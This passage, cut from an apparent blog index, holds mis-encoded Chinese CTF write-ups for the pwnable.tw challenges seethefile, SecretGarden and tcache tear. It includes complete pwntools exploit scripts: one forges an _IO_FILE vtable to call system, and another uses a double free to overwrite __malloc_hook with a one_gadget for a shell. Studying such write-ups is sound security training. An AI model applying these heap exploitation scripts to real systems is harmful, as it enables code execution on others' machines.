information(0,0)\nlog.warn(\"heap addr: 0x%x \" % heap_addr)\n\nfor i in range(0,8):\n    add_page(0x64,\"a\"*8)\n\ntop_addr = view_page(3)\nlog.warn(\"top_addr: 0x%x\" % top_addr)\n#yuancheng\nlibc_base = top_addr - 0x58 - 0x3c3b20\n#bendi\n#libc_base = top_addr - 0x58 - 0x3c4b20\nlog.warn(\"libc_base: 0x%x\" % libc_base)\n\nfakefile = \"/bin/sh\\0\" + p64(0x61) + p64(0) + p64(libc_base + mylibc.symbols['_IO_list_all']-0x10) + p64(2) + p64(3)\nfakefile += \"\\x00\"*0x90 + p64(0xffffffffffffffff) + \"\\x00\"*0x10 \nfakefile += p64(heap_addr + 0x390 + 0xe0)\n\nvtable = p64(0) + p64(0) + p64(1) + p64(libc_base + mylibc.symbols[\"system\"])\n\npayload = \"\\x00\"*0x390 + fakefile + vtable\nedit_page(0,payload)\n\nmyproc.recvuntil(\"Your choice :\")\nmyproc.sendline(str(1))\nmyproc.recvuntil(\"Size of page :\")\nmyproc.sendline(str(0x10))\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n\n\n","categories":["CTF"]},{"title":"pwnable.twä¹‹seethefile","url":"/2020/03/29/seethefile/","content":"\n[é¢˜ç›®é“¾æ¥](https://pwnable.tw/challenge/#9)\n\n# 1 åˆ†æ\n\n```shell\n$ file seethefile \nseethefile: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=04e6f2f8c85fca448d351ef752ff295581c2650d, not stripped\n$ checksec seethefile\n[*] '/mnt/hgfs/vmshare-1604/seethefile/seethefile'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n- 32ä½äºŒè¿›åˆ¶å¯æ‰§è¡Œç¨‹åº\n- åŠ¨æ€é“¾æ¥\n- gotè¡¨å¯è¯»å¯å†™\n- æ ˆä¸å¯æ‰§è¡Œï¼Œæœªå¼€æ ˆcanary\n- æœªéšæœºåŒ–\n\nç¨‹åºä¸€å…±å®ç°äº†äº”ä¸ªåŠŸèƒ½ï¼š\n\n- openï¼šæ‰“å¼€æ–‡ä»¶\n\n- readï¼šè¯»æ–‡ä»¶\n\n- write to screenï¼šå°†è¯»å–çš„å†…å®¹æ‰“å°åˆ°å±å¹•\n\n- closeï¼šå…³é—­æ–‡ä»¶\n- exitï¼šé€€å‡º\n\næ‰€æœ‰æ“ä½œéƒ½æ˜¯é’ˆå¯¹å¦‚ä¸‹å‡ ä¸ªbssæ®µçš„å…¨å±€å˜é‡ï¼š\n\n- char filename[64]\n- char magicbuf[416]\n- nameï¼Œå 0x20ä¸ªå­—èŠ‚\n- FILE *fp\n\nopenfileè¯»å–å­—ç¬¦ä¸²åˆ°filename[64]å¤„ï¼Œå¦‚æœæ–‡ä»¶åä¸åŒ…å«â€œflagâ€å­—ç¬¦ä¸²å°±æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶å°†æ–‡ä»¶æè¿°ç¬¦æŒ‡é’ˆå…³è”åˆ°bssæ®µçš„FILE *fpã€‚\n\nreadfileå°†æ‰“å¼€æ–‡ä»¶çš„å†…å®¹è¯»å–åˆ°magicbuf[416]ã€‚\n\nwrite to screenå°†magicbuf[416]ä¸­çš„å†…å®¹æ‰“å°åˆ°å±å¹•ä¸Šã€‚ï¼ˆfilenameä¸èƒ½åŒ…å«â€œflagâ€ï¼Œå†…å®¹ä¸­ä¸èƒ½åŒ…å«\"FLAG\"æˆ–\"}\"ï¼‰\n\ncloseå°†æ‰“å¼€çš„æ–‡ä»¶å…³é—­ã€‚\n\nexité€€å‡ºå‰ä¼šè¯»å–ä¸€æ®µå­—ç¬¦ä¸²åˆ°bssæ®µçš„nameå¤„ï¼Œç„¶ååˆ¤æ–­fpæ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ä¸ºç©ºå°±fslose(fp)ã€‚å¦‚ä¸‹ä»£ç ï¼š\n\n```c\n      case 5:\n        printf(\"Leave your name :\");\n        __isoc99_scanf(\"%s\", &name);\n        printf(\"Thank you %s ,see you next time\\n\", &name);\n        if ( fp )\n          fclose(fp);\n        exit(0);\n        return;\n```\n\næ¼æ´ç‚¹ï¼šnameå’Œfpç›¸é‚»ï¼Œnameå¤„åœ¨ä½åœ°å€ï¼Œfpå¤„åœ¨é«˜åœ°å€ã€‚scanfæœªé™åˆ¶nameè¾“å…¥çš„å­—ç¬¦ä¸²å¤§å°ï¼Œå¯¼è‡´æº¢å‡ºè¦†ç›–fpæŒ‡é’ˆã€‚\n\nè§¦å‘ä»£ç ï¼š\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./seethefile')\n#mylibc = ELF('./libc_32.so.6')\nmylibc = ELF(\"/lib32/libc-2.23.so\")\nmyproc = process(myelf.path)\n#myproc = process(['./seethefile'], env={\"LD_PRELOAD\":\"./libc_32.so.6\"})\n#myproc = remote('chall.pwnable.tw',10200)\n\ndef openfile(filename):\n    myproc.sendlineafter(\"Your choice :\",'1')\n    myproc.sendlineafter(\"What do you want to see :\",filename)\n\ndef readfile():\n    myproc.sendlineafter(\"Your choice :\",'2')\n\ndef printfile():\n    myproc.sendlineafter(\"Your choice :\",'3')\n\ndef closefile():\n    myproc.sendlineafter(\"Your choice :\",'4')\n\ndef exit(name):\n    myproc.sendlineafter(\"Your choice :\",'5')\n    myproc.sendlineafter(\"Leave your name :\",name)\n\nclosefile()\ngdb.attach(myproc)\nexit('a'*50)\nmyproc.interactive()\n```\n\næ‰§è¡Œä»¥ä¸Šå‡ºå‘ä»£ç ï¼Œè§‚å¯Ÿå †æ ˆå‘ç°eaxå’Œesiéƒ½è¢«è¾“å…¥çš„â€œaâ€å­—ç¬¦ç»™è¦†ç›–äº†ã€‚\n\n```shell\n$eax   : 0x61616161 (\"aaaa\"?)\n$ebx   : 0xf7f7a000  â†’  0x001afdb0\n$ecx   : 0xffffffff\n$edx   : 0xf7f7b870  â†’  0x00000000\n$esp   : 0xffe11f60  â†’  0xf7faa7eb  â†’   add esi, 0x15815\n$ebp   : 0xffe11f88  â†’  0xffe11fd8  â†’  0x00000000\n$esi   : 0x61616161 (\"aaaa\"?)\n$edi   : 0xf7f7a000  â†’  0x001afdb0\n$eip   : 0xf7e26ed7  â†’  <fclose+23> cmp BYTE PTR [esi+0x46], 0x0\n$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86\n```\n\n# 2 åˆ©ç”¨\n\næ ¹æ®fcloseçš„ç‰¹æ€§ï¼Œå‚è€ƒäº†ä»¥ä¸‹å‡ ç¯‡æ–‡ç« ï¼š\n\n[pwnable.tw 9 seethefile ](https://blog.csdn.net/qq_42192672/article/details/84782627)\n\n[glibc fcloseæºä»£ç é˜…è¯»åŠä¼ªé€ _IO_FILEåˆ©ç”¨fcloseå®ç°ä»»æ„åœ°å€æ‰§è¡Œ](https://www.jianshu.com/p/2e00afb01606)\n\nï¼ˆ1ï¼‰_IO_FILEç»“æ„ä½“å¤§å°ä¸º0x94\n\nï¼ˆ2ï¼‰flags & 0x2000ä¸º0å°±ä¼šç›´æ¥è°ƒç”¨_IO_FINSH(fp)ï¼Œ_IO_FINISH(fp)ç›¸å½“äºè°ƒç”¨fp->vtabl->__finish(fp)\n\nï¼ˆ3ï¼‰å°†fpæŒ‡å‘ä¸€å—å†…å­˜Pï¼ŒPåç§»0çš„å‰4å­—èŠ‚è®¾ç½®ä¸º0xffffdfffï¼ŒPåç§»4ä½ç½®æ”¾ä¸Šè¦æ‰§è¡Œçš„å­—ç¬¦ä¸²æŒ‡ä»¤ï¼ˆå­—ç¬¦ä¸²ä»¥';'å¼€å¤´å³å¯ï¼‰ï¼ŒPåç§»sizeof(_IO_FILE)å¤§å°ä½ç½®ï¼ˆvtableï¼‰è¦†ç›–ä¸ºå†…å­˜åŒºåŸŸQï¼ŒQåç§»2*4å­—èŠ‚å¤„(vtable->__finish)è¦†ç›–ä¸ºsystemå‡½æ•°åœ°å€å³å¯\n\nï¼ˆ4ï¼‰vtableæ˜¯ä¸ªè™šæ ‡æŒ‡é’ˆï¼Œé‡Œé¢ä¸€èˆ¬æ€§æ˜¯21or23ä¸ªå˜é‡\n\nexpå¦‚ä¸‹ï¼š\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./seethefile')\nmylibc = ELF('./libc_32.so.6')\n#mylibc = ELF(\"/lib32/libc-2.23.so\")\n#myproc = process(myelf.path)\n#myproc = process(['./seethefile'], env={\"LD_PRELOAD\":\"./libc_32.so.6\"})\nmyproc = remote('chall.pwnable.tw',10200)\n\ndef openfile(filename):\n    myproc.sendlineafter(\"Your choice :\",'1')\n    myproc.sendlineafter(\"What do you want to see :\",filename)\n\ndef readfile():\n    myproc.sendlineafter(\"Your choice :\",'2')\n\ndef printfile():\n    myproc.sendlineafter(\"Your choice :\",'3')\n\ndef closefile():\n    myproc.sendlineafter(\"Your choice :\",'4')\n\ndef exit(name):\n    myproc.sendlineafter(\"Your choice :\",'5')\n    myproc.sendlineafter(\"Leave your name :\",name)\n\n#æ³„éœ²libc\nopenfile(\"/proc/self/maps\")\nreadfile()\nprintfile()\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlibc_addr = int(myproc.recv(8),16) + 0x1000\nlog.warn(\"libc_addr : 0x%x\" % libc_addr)\nsys_addr = libc_addr + mylibc.symbols['system']\nlog.warn(\"sys_addr: 0x%x\" % sys_addr)\nclosefile()\n#è¦†ç›–å‡½æ•°æŒ‡é’ˆ\nopenfile('/proc/self/maps')\nFAKE_IO_FILE_addr = 0x0804b300\npayload = \"a\"*32 + p32(FAKE_IO_FILE_addr)\npayload += \"\\x00\"*(0x80-4)\npayload += \"\\xff\\xff\\xdf\\xff;sh\\x00\".ljust(0x94,'\\x00')\npayload += p32(FAKE_IO_FILE_addr + 0x98)\npayload += p32(sys_addr)*21\nexit(payload)\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\nå…¶ä»–è§£é¢˜æ€è·¯ï¼š\n\n[seethefile è§£é¢˜æ€è·¯](http://p4nda.top/2017/09/20/pwnable-tw-seethefile/)\n\n","categories":["CTF"]},{"title":"pwnable.twä¹‹SecretGarden","url":"/2020/03/20/SecretGarden/","content":"\n[é¢˜ç›®é“¾æ¥](https://pwnable.tw/challenge/#12)\n\nå‚è€ƒWPï¼š\n\n[pwnable.twä¸­çš„secretgarden](https://www.lyyl.online/2019/09/27/pwnable-twä¸­çš„secretgarden/)\n\n[pwnable.tw 11~18é¢˜ writeup](https://veritas501.space/2018/03/04/pwnable.tw 11~18é¢˜ writeup/)\n\n[pwnable.tw-secretgarden](https://blog.ivan0.com/2018/11/18/pwnable-tw-secretgarden/)\n\n# 1 åˆ†æ\n\n## 1.1 linuxä¸‹æŸ¥çœ‹äºŒè¿›åˆ¶ä¿¡æ¯\n\nä¸¤æ¡å‘½ä»¤æŸ¥çœ‹ç»™å®šäºŒè¿›åˆ¶æ–‡ä»¶åŸºæœ¬ä¿¡æ¯ï¼š\n\n```shell\n$ file secretgarden \nsecretgarden: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=cc989aba681411cb235a53b6c5004923d557ab6a, stripped\n\n$ checksec secretgarden \n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /home/bling/.pwntools-cache-2.7/update to 'never'.\n[*] You have the latest version of Pwntools (4.0.1)\n[*] '/mnt/hgfs/vmshare-1604/secret_gargen/secretgarden'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n```\n\nä»¥ä¸Šä¿¡æ¯å¯ä»¥å¾—çŸ¥ï¼š\n\n- 64ä½äºŒè¿›åˆ¶å¯æ‰§è¡Œç¨‹åºï¼ŒåŠ¨æ€é“¾æ¥ï¼Œå»ç¬¦å·è¡¨\n- gotè¡¨ä¸å¯å†™\n- æ ˆä¸å¯æ‰§è¡Œï¼Œå¼€å¯æ ˆcanary\n- åœ°å€éšæœºåŒ–å¼€å¯\n\n## 1.2 IDAé€†å‘æºç é€»è¾‘\n\nç¬¬ä¸€çœ¼å°±çœ‹åˆ°äº†alarmå‡½æ•°ï¼Œpatchæ‰ã€‚\n\n```c\nvoid __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  __int64 choice_1; // [rsp+0h] [rbp-28h]\n  unsigned __int64 v4; // [rsp+8h] [rbp-20h]\n\n  v4 = __readfsqword(0x28u);\n  time_alarm();\n  while ( 1 )\n  {\n    print_info();\n    read(0, &choice_1, 4uLL);\n    switch ( (unsigned int)strtol((const char *)&choice_1, 0LL, 10) )\n    {\n      case 1u:\n        raise();                                // Raise a flower\n        break;\n      case 2u:\n        visit();                                // Visit the garden\n        break;\n      case 3u:\n        remove();                               // Remove a flower from the garden\n        break;\n      case 4u:\n        clean();                                // Clean the garden\n        break;\n      case 5u:\n        puts(\"See you next time.\");             // Leave the garden\n        exit(0);\n        return;\n      default:\n        puts(\"Invalid choice\");\n        break;\n    }\n  }\n}\n```\n\næºç ä¸€å…±å®ç°äº†5ä¸ªåŠŸèƒ½ï¼Œåˆ†åˆ«æ˜¯raise()ï¼Œvisit()ï¼Œremove()ï¼Œ clean()ï¼Œä»¥åŠä¸€ä¸ªexit(0)é€€å‡ºå‡½æ•°ã€‚ç€é‡åˆ†æå‰ä¸‰ä¸ªå‡½æ•°åŠŸèƒ½ã€‚\n\n- raise()å‡½æ•°\n\nç»è¿‡åˆ†æï¼Œraise()çš„åŠŸèƒ½ä¸»è¦æ˜¯mallocä¸€ä¸ªå †å—ï¼ˆflower_chunkï¼‰ï¼Œå¹¶å°†è¯¥å †å—é“¾æ¥åˆ°bssæ®µqword_202040ï¼ˆå¤§å°ä¸º100çš„æ•°ç»„ï¼‰ï¼Œä¸€å…±å¯ä»¥å…»100æ”¯èŠ±ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\n\n![](secretgarden1.png)\n\n- visit()å‡½æ•°\n\nè¯¥å‡½æ•°ä¼šéå†bssæ®µä¸Šå…¨å±€å˜é‡qword_202040[100]ä¸­å„ä¸ªå…ƒç´ ï¼Œå¹¶æ‰“å°flower_chunkç¬¬ä¸€ä¸ªå…ƒç´ ä¸º1çš„å †å—å†…å®¹ï¼ˆflower_chunkçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º1è¡¨æ˜è¯¥flowerå¤„äºraiseçŠ¶æ€ï¼Œå½“removeåç¬¬ä¸€ä¸ªå…ƒç´ ä¼šå˜ä¸º0ï¼‰ã€‚\n\n- remove()å‡½æ•°\n\nè¯¥å‡½æ•°æ ¹æ®æŒ‡å®šçš„æ•°ç»„ä¸‹æ ‡ï¼Œå°†å¯¹åº”çš„flower_chunkç¬¬ä¸€ä¸ªå…ƒç´ ç½®ä¸º0ï¼Œå¹¶å°†ç¬¬äºŒä¸ªå…ƒç´ æŒ‡å‘çš„å †å—freeæ‰ã€‚å…¶ä¸­freeä»£ç å¦‚ä¸‹ï¼š\n\n```c\nif ( v2 <= 99 && (v1 = (_DWORD *)qword_202040[v2]) != 0LL )\n  {\n    *v1 = 0;\n    free(*(void **)(qword_202040[v2] + 8LL));\n    result = puts(\"Successful\");\n  }\n```\n\nå¯ä»¥çœ‹åˆ°ï¼Œæœ¬é¢˜çš„æ¼æ´ç‚¹å°±åœ¨è¿™å„¿ã€‚freeæ“ä½œåï¼Œå¹¶æ²¡æœ‰å°†flower_chunkçš„ç¬¬äºŒä¸ªå…ƒç´ ç½®NULLï¼Œå¯¼è‡´ä¸€ä¸ªæ‚¬ç©ºæŒ‡é’ˆçš„äº§ç”Ÿã€‚\n\n- clean()å‡½æ•°\n\nå¯¹deleteè¿‡çš„èŠ‚ç‚¹ï¼Œå°†å…¶ä»bssæ®µçš„qword_202040[100]ä¸­é‡Šæ”¾ï¼Œå¹¶å°†qword_202040[100]ç›¸åº”å…ƒç´ ç½®0ã€‚è¿™ä¸ªå‡½æ•°åœ¨æˆ‘åˆ©ç”¨ä¸­æ²¡æœ‰ç”¨åˆ°ã€‚\n\n## 1.3 æ¼æ´è§¦å‘\n\nä»¥double freeçš„æ–¹å¼è§¦å‘è¯¥æ¼æ´ï¼Œä»£ç å¦‚ä¸‹ï¼š\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('40','f0','c0')\nRaise('40','f1','c1')\nRemove('0')\nRemove('0')\nmyproc.interactive()\n```\n\næ‰§è¡Œåï¼Œå‡ºç°å¦‚ä¸‹é”™è¯¯æç¤ºä¿¡æ¯ï¼š\n\n```shell\n[DEBUG] Received 0x5b bytes:\n    \"*** Error in `./secretgarden': double free or corruption (fasttop): 0x000055e3496bc050 ***\\n\"\n*** Error in `./secretgarden': double free or corruption (fasttop): 0x000055e3496bc050 ***\n```\n\n# 2 åˆ©ç”¨\n\næœ¬é¢˜æœ‰ä¸€ä¸ªdouble freeçš„æ¼æ´ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªvisit()å‡½æ•°å¯ä»¥æ‰“å°flower_chunkçš„å †å—å†…å®¹ã€‚å› æ­¤å¯ä»¥å°†libcä¸­çš„æŸä¸ªåœ°å€æ³„éœ²åˆ°flower_chunkå †å—ä¸­ï¼Œè°ƒç”¨visit()å‡½æ•°è¿›è¡Œæ‰“å°ï¼Œæœ€åé€šè¿‡åç§»è®¡ç®—libcåŸºå€ã€‚double freeè¿˜å¯ç”¨äºæ„é€ ä»»æ„åœ°å€å†™ï¼Œå¯»æ‰¾åˆé€‚çš„å‡½æ•°æŒ‡é’ˆï¼ˆå¦‚ç¨‹åºè‡ªå¸¦çš„å‡½æ•°æŒ‡é’ˆï¼Œgotè¡¨é¡¹ï¼Œfini_arrayæ®µå‡½æ•°æŒ‡é’ˆæˆ–è€…libcä¸­çš„å‡½æ•°æŒ‡é’ˆï¼‰å°†å…¶è¦†ç›–ä¸ºsystemå‡½æ•°ï¼ˆå¹¶æ„é€ å‚æ•°\"/bin/sh\\x00\"ï¼‰ï¼Œæˆ–è€…ç›´æ¥è°ƒç”¨one_gadgetã€‚\n\n- æ³„éœ²libcåœ°å€\n\nåˆ©ç”¨unsorted binçš„ç‰¹æ€§ã€‚é‡Šæ”¾ä¸€ä¸ªå †å—åˆ°unsorted binï¼Œç„¶ååˆç”³è¯·è¯¥å¤§å°çš„å †å—ï¼Œè°ƒç”¨visit()æ‰“å°flower_chunkä¸­çš„nameå †å—å…¶å‰0-8æˆ–8-16å­—èŠ‚ã€‚\n\nåœ¨è¦†ç›–0-8å­—èŠ‚æ—¶æœ‰ä¸¤ç§åŠæ³•ï¼š\n\n1ï¼‰ä½¿ç”¨` sendline(\"a\"*7) `æˆ–`send(\"a\"*8) `\n\n2ï¼‰ä½¿ç”¨`send(\"\")`\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('38','f0','c0')\nRaise('200','f1','c1')\nRaise('38','f2','c2')\nRemove('0')\nRemove('1')\nRaise('200','a'*7,'c3')\n# å¿…é¡»ä¿è¯è¾“å…¥çš„nameåŠ ä¸Šå­—ç¬¦ä¸²ç»“å°¾ç¬¦æ­£å¥½æ˜¯8ä¸ªå­—èŠ‚,è¿™æ ·æ‰èƒ½æ³„éœ²å‡ºå8ä¸ªå­—èŠ‚çš„åœ°å€\nVisit()\nmyproc.recvuntil('aaaaaaa\\n')\ntop_addr = u64(myproc.recv(6)+'\\x00\\x00')\nlibc_addr = top_addr - 0x3C3B78\n# ä½¿ç”¨ç»™å®šçš„libc_64.so.6,åœ¨è°ƒè¯•æ—¶å¯ä»¥ç®—å‡ºtop_addrå’Œlibc_addrä¹‹é—´çš„å·®å€¼ä¸º0x3C3B78\nlog.warn(\"top_addr:0x%x\" % top_addr)\nlog.warn(\"libc_addr:0x%x\" % libc_addr)\n\ngdb.attach(myproc)\nmyproc.interactive()\n```\n\n- è¦†ç›–å‡½æ•°æŒ‡é’ˆ\n\nç»è¿‡åˆ†æï¼Œæœ¬é¢˜é‡‡ç”¨è¦†ç›–`libcå‡½æ•°æŒ‡é’ˆ+one_gadget`çš„æ–¹å¼è¿›è¡Œåˆ©ç”¨ã€‚ç›´æ¥è¦†ç›–mallocå‡½æ•°çš„æ–¹å¼ä¸å¯è¡Œï¼Œå› ä¸ºone_gadgetéƒ½æœ‰constraintsçº¦æŸæ¡ä»¶ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºã€‚\n\n```shell\n$ one_gadget libc_64.so.6 \n0x45216 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4526a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xef6c4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf0567 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\nå †é‡Œé¢æœ‰ä¸€ç§æƒ…å†µï¼Œå°±æ˜¯freeæˆ–è€…mallocå‡ºé”™æ—¶ï¼Œä¼šå»è°ƒç”¨`malloc_printerr`æ‰“å°é”™è¯¯ä¿¡æ¯ï¼ˆå¦‚æ£€æµ‹åˆ°double freeæ—¶ï¼‰ã€‚è¿™ä¸ªå‡½æ•°ä¸­ä¼šå»è°ƒç”¨mallocï¼Œæ­¤æ—¶çš„rsp+0x50å¯ä»¥æ»¡è¶³ä¸Šè¿°çº¦æŸæ¡ä»¶ã€‚\n\nå‚è€ƒ[gdbå¸¦æºç è°ƒè¯•libc](https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/20/gdb/)æ–¹æ³•è·å–æ‰§è¡Œåˆ°`__malloc_hook`æ—¶çš„çº¦æŸæ¡ä»¶ã€‚\n\nå› æ­¤ï¼Œé€‰æ‹©å°†`__malloc_hook`å‡½æ•°æŒ‡é’ˆè¦†ç›–ä¸ºone_gadgetåœ°å€ã€‚æœ€åè§¦å‘ä¸€æ¬¡double freeï¼Œè¿›å…¥`malloc_printerr`ä¸­è°ƒç”¨`malloc`å‡½æ•°æ—¶ä¼šå…ˆæ‰§è¡Œ`__malloc_hook`ï¼Œäºæ˜¯one_gadgetå¾—åˆ°æ‰§è¡Œï¼ŒæˆåŠŸget shellã€‚\n\n# 3 EXP\n\næœ€ç»ˆçš„expå¦‚ä¸‹ï¼š\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./secretgarden')\nmylibc = ELF('libc_64.so.6')\n#myproc = process(myelf.path)\nmyproc = process(['./secretgarden'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#myproc = remote('chall.pwnable.tw',10203)\n\ndef Raise(flength,fname,fcolor):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('1')\n    myproc.recvuntil('Length of the name :')\n    myproc.sendline(flength)\n    myproc.recvuntil('The name of flower :')\n    myproc.sendline(fname)\n    myproc.recvuntil('The color of the flower :')\n    myproc.sendline(fcolor)\n\ndef Visit():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('2')\n\ndef Remove(findex):\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('3')\n    myproc.recvuntil('Which flower do you want to remove from the garden:')\n    myproc.sendline(findex)\n\ndef Clean():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('4')\n\ndef Leave():\n    myproc.recvuntil('Your choice : ')\n    myproc.sendline('5')\n\nRaise('38','f0','c0')\nRaise('200','f1','c1')\nRaise('38','f2','c2')\nRemove('0')\nRemove('1')\nRaise('200','a'*7,'c3')\n# å¿…é¡»ä¿è¯è¾“å…¥çš„nameåŠ ä¸Šå­—ç¬¦ä¸²ç»“å°¾ç¬¦æ­£å¥½æ˜¯8ä¸ªå­—èŠ‚,è¿™æ ·æ‰èƒ½æ³„éœ²å‡ºå8ä¸ªå­—èŠ‚çš„åœ°å€\nVisit()\nmyproc.recvuntil('aaaaaaa\\n')\ntop_addr = u64(myproc.recv(6)+'\\x00\\x00')\nlibc_addr = top_addr - 0x3C3B78\n# ä½¿ç”¨ç»™å®šçš„libc_64.so.6,åœ¨è°ƒè¯•æ—¶å¯ä»¥ç®—å‡ºtop_addrå’Œlibc_addrä¹‹é—´çš„å·®å€¼ä¸º0x3C3B78\n# log.warn(\"top_addr:0x%x\" % top_addr)\n# log.warn(\"libc_addr:0x%x\" % libc_addr)\n\nmalloc_hook = libc_addr + mylibc.symbols['__malloc_hook']\nfake_chunk = malloc_hook - 0x23\n# æ ¹æ®__malloc_hookä½åœ°å€çš„æƒ…å†µï¼Œ__malloc_hook - 0x13å¤„å¯ä»¥æ„é€ 8å­—èŠ‚0x000000000000007fä½œä¸ºfake_chunkçš„å¤§å°ï¼Œæ­¤æ—¶fake_chunkçš„åœ°å€ä¸º__malloc_hook - 0x13 - 0x10\ngadget_addr = libc_addr + 0xf0567\n\nRaise('100','f0','c4')\nRaise('100','f1','c5')\nRemove('4')\nRemove('5')\nRemove('4')\nRaise('100',p64(fake_chunk),'c6')\nRaise('100','xx','c7')\nRaise('100','xx','c8')\nlog.warn('fake_chunk: 0x%x' % fake_chunk)\nlog.warn('malloc_hook: 0x%x' % malloc_hook)\nlog.warn('libc_addr: 0x%x' % libc_addr)\nlog.warn('gadget_addr: 0x%x' % gadget_addr)\n# hacked fastbin to fake_chunk\nRaise('100','a'*0x13 + p64(gadget_addr),'c9')\n# size 0x70 104\n# size 0x60 88\nRemove('8')\nRemove('8')\n#Visit()\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n","categories":["CTF"]},{"title":"pwnable.twä¹‹tcache tear","url":"/2020/03/13/tcachetear/","content":"\n[Tcache tearé¢˜ç›®é“¾æ¥](https://pwnable.tw/challenge/#33)\n\n# 1 åˆ†æ\n\n## 1.1 linuxä¸‹æŸ¥çœ‹äºŒè¿›åˆ¶ä¿¡æ¯\n\n```shell\n$ file tcache_tear\ntcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a273b72984b37439fd6e9a64e86d1c2131948f32, stripped\n\n$ checksec tcache_tear\n[*] '/mnt/hgfs/vmshare-1804/Tcache-tear/tcache_tear'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n    FORTIFY:  Enabled\n```\n\nå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š\n\n- 64ä½äºŒè¿›åˆ¶ç¨‹åºï¼ŒåŠ¨æ€é“¾æ¥ï¼Œå»ç¬¦å·è¡¨\n- gotè¡¨ä¿æŠ¤å¼€å¯ï¼Œgotè¡¨ä¸å¯å†™\n- æ ˆä¿æŠ¤å¼€å¯ï¼Œæ ˆä¸å¯æ‰§è¡Œï¼Œä¸”æœ‰canary\n- æ²¡æœ‰å¼€å¯åœ°å€éšæœºåŒ–\n\n## 1.2 IDAé€†å‘æºç 